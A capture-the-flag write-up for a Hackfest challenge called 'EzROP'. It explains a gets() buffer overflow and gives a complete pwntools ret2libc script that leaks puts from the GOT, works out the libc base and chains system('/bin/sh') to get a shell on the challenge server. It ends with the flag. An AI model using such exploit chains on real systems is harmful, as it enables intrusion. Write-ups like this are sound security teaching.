#EzROP

> ROP\
> \
> Format Flag : hackfest0x5{}

We decompile the binary file for analysis using IDA Pro, there is a vuln () function if clicked can be seen there is a gets function again\
![image](https://user-images.githubusercontent.com/41176663/170179280-9df17668-6fa7-44dd-9099-1208072fe109.png)
\
Let's try to make the payload using python and libc\
```py
#!/usr/bin/env python

from pwn import *
from pprint import pprint

context.arch = 'amd64'

offset = 40

elf = ELF("./chall")
# p = elf.process()
p = remote("202.125.94.123", 60902)

rop = ROP(elf)
rop.call(elf.symbols["puts"], [elf.got['puts']])
rop.call(elf.symbols["vuln"])

p.recvuntil("\n")

payload = [
    b"A"*offset,
    rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)

puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
log.info(f"puts found at {hex(puts)}")

libc = ELF("libc6_2.31-0ubuntu9_amd64.so")
libc.address = puts - libc.symbols["puts"]
log.info(f"libc base address determined {hex(libc.address)}")

rop = ROP(libc)
rop.call("puts", [ next(libc.search(b"/bin/sh\x00")) ])
rop.call("system", [ next(libc.search(b"/bin/sh\x00")) ])
rop.call("exit")

payload = [
    b"A"*offset,
    rop.chain()
]

payload = b"".join(payload)
with open("payload", "wb") as h:
    h.write(payload)
p.sendline(payload)

p.interactive()
```
When we run the script\
![image](https://user-images.githubusercontent.com/41176663/170179408-5451ac4f-2e2c-4b4b-9b29-97232daf1922.png)
\
The flag is `hackfest0x5{ez_R0p_Ez_W1n_:D__}`

Here I follow the tutorial given by John Hammond
https://youtu.be/i5-cWI_HV8o
